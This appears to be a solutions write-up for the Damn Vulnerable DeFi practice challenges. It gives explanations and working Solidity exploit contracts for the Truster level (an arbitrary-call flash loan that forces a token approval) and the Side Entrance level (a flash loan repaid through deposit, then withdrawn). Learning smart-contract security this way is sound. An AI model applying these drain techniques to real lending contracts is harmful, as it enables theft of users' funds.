# Damn Vulnerable DeFi Solutions

https://www.damnvulnerabledefi.xyz/
By [@theredguild](https://x.com/theredguild)


## 1- Unstoppable
TODO

## 2- Naive receiver
TODO

## 3- [Truster](https://www.damnvulnerabledefi.xyz/challenges/truster/)

##### Keywords:
- Flashloans
- ERC20
- Arbitrary calls

##### Mission:
- The lending pool is offering flashloan and we should recue the funds by using the flashloan.
- Executing a single transaction
- Deposit the funds into the designated recovery account.

##### Solution:
- Entry point is `flashloan()` function and we have just four parameters to solve the challange.
- Since DVT is an ERC20 token, we can perform the **approve** operation on the tokens during the flashloan run. 
We are not moving the tokens out with the flashloan, instead we are forcing the vulnerable contract to approve our contract.
Thus, after the flashloan we will have the ability to transfer tokens to the recovery address using the `transferFrom` function.
The **amount** and the **borrower** parameter does not matter. We just need to set the **taget** and **data**.

##### Instructions:
```bash
forge test --mp test/truster/Truster.t.sol
```

**The solution contract:**
```solidity
contract PlayerTranser {
    TrusterLenderPool pool;
    DamnValuableToken token;

    constructor(
        TrusterLenderPool _pool,
        DamnValuableToken _token,
        address recovery
    ) {
        pool = _pool;
        token = _token;
        pool.flashLoan({
            amount: 0,
            borrower: address(0),
            target: address(token),
            data: abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                type(uint256).max
            )
        });

        token.transferFrom(address(pool), recovery, 1000000e18);
    }
}
```

**The solution test function:**
```solidity
    function test_truster() public checkSolvedByPlayer {
        new PlayerTranser(pool, token, recovery);
    }
```


## 4- [Side Entrance](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/)
##### Keywords:
- Flashloans
- Ether

##### Mission:
- Similar to the Truster level
- The main difference is that we are not using an ERC20 yoken but Ether.
- Also on this level, we cannot call any arbitrary functions but call only the `execute` function over the flashloan.
- Rescuing all ETH from the pool and depositing it in the designated recovery account.

##### Solution:
- The enry points are **deposit**, **withdraw**, **flashloan**
- To be able to solve the challange, we need to combine those functions.
- First we need to take the fund with flashloan: `pool.flashLoan(address(pool).balance);`
- After we must repay it it has no **receive** or **fallback** function. We can only repay with the deposit function: `pool.deposit{value: msg.value}();`
- When we call the deposit function, the funds will be assigned to us as the caller.
- So, we can use the **withdraw** function and take the funds out
- To be able to receive the funds with the withdraw, we also need a receive function.

##### Instructions:
```bash
forge test --mp test/side-entrance/SideEntrance.t.sol
```

**The solution contract:**
```solidity
contract PlayerSideEntrance {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function run(address recovery) external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
        console.log("Got the funds");
    }

    receive() external payable {}
}
```

**The solution test function:**
```solidity
    function test_sideEntrance() public checkSolvedByPlayer {
        PlayerSideEntrance myContract = new PlayerSideEntrance(pool);
        myContract.run(recovery);
    }
```


#### References
- [ Smart Contract Security Through Damn Vulnerable DeFi v4 | Tincho (The Red Guild) - DSS 101 2024 ](https://www.youtube.com/watch?v=3wWzQJvoXdg)
